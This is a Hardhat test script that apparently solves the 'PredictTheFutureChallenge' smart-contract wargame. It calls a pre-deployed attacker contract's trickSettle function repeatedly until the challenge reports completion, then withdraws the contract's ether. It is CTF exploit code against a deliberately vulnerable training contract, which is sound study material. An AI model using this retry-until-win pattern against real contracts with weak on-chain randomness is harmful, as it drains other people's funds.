import { expect } from "chai";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer, utils } from "ethers";

const fromAddress = '0x2810d5E289f885d25437743A11C6159F82ca5d28';
describe("PredictTheFutureChallenge", function () {
  let deployer: Signer;
  let attacker: Signer;

  const getWei = (eth: string) => {
    return ethers.utils.parseEther(eth);
  };
  const getEth = (wei: BigNumber) => {
    return wei.div("1000000000000000000");
  };

  beforeEach(async function () {
    [attacker, deployer] = await ethers.getSigners();
  });

  it("Should predict", async function () {
    const challengeAddress = "0xA087AA95D33687fbA77242425A600636d467f389";
    const challenge = await ethers.getContractAt("PredictTheFutureChallenge", challengeAddress);
    // challenge = await Challenge.deploy({ value: utils.parseEther('1.0') });
    // await challenge.deployed();

    // const Solution = await ethers.getContractFactory("PredictTheFutureSolution", attacker);
    // const solution = await Solution.deploy(challengeAddress, { value: getWei('1.0'), gasLimit: 6500000 });
    // await solution.deployed();
    const solution = await ethers.getContractAt("PredictTheFutureSolution", "0xA7e241317E742e8506e5f033d36085E13dbC3CAD");

    console.log('solution deployed');

    for (let i = 0; i <= 1000; i++) {
      console.log(`[${i}] trickSettle...`);
      const receipt = await solution.trickSettle({ gasLimit: 6500000 });
      await receipt.wait();

      if (true === await challenge.isComplete()) {
        console.log(`done, withdrawing balance...`);
        await solution.withdraw({ gasLimit: 6500000 });
        break;
      }
    }
  });
})
